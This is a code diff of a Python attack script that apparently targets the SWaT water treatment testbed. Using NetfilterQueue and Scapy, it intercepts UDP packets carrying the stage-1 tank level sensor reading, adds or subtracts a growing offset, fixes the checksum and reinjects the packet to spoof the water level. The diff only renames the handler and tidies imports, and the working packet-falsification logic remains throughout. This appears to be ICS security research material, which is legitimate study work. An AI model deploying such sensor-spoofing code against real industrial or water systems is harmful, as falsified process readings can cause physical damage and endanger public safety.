@@ -33,8 +33,8 @@ from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 
-import scaling
-import swat
+from swat.plc1 import SWAT_P1_RIO_AI
+from swat.scaling import current_to_signal, signal_to_current, P1Level
 
 
 class RepeatEvery(threading.Thread):
@@ -70,13 +70,13 @@ def update_attack_level():
     multip += 1
 
 
-def __spoof(packet):
+def __inject(packet):
     pkt = IP(packet.get_payload())
-    if swat.SWAT_P1_RIO_AI in pkt:
-        slevel = scaling.current_to_signal(pkt[swat.SWAT_P1_RIO_AI].level, scaling.P1Level)
+    if SWAT_P1_RIO_AI in pkt:
+        slevel = current_to_signal(pkt[SWAT_P1_RIO_AI].level, P1Level)
         slevel += max_attack if slope_sign else -max_attack
-        level = scaling.signal_to_current(slevel, scaling.P1Level)
-        pkt[swat.SWAT_P1_RIO_AI].level = level
+        level = signal_to_current(slevel, P1Level)
+        pkt[SWAT_P1_RIO_AI].level = level
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
 
@@ -86,7 +86,7 @@ def __spoof(packet):
 def start():
     __setup()
     nfqueue = NetfilterQueue()
-    nfqueue.bind(0, __spoof)
+    nfqueue.bind(0, __inject)
     thread = RepeatEvery(1, update_attack_level)
     try:
         print("[*] starting water level spoofing")
